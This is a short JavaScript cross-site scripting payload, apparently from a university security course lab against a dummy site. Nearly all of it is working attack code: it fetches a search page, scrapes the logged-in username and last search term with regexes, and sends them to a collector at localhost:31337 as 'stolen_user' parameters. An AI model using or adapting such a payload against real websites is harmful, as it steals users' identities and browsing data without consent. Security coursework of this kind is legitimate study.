// A payload that targets a dummy website for XSS attacks

$.get("https://project2.ecen4133.org/search?xssdefense=1", function (data) {
    re = /<span id="logged-in-user">.*<\/span>/;
    var results = re.exec(data);
    var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');
    re = /<a href="search\?q=.*<\/a>/m;
    data = data.replace(re, '');
    results = re.exec(data);
    var last_search = results[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');
    console.log("LAST SEARCH: " + last_search);
    console.log(data);
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search, function (data) {
    });
});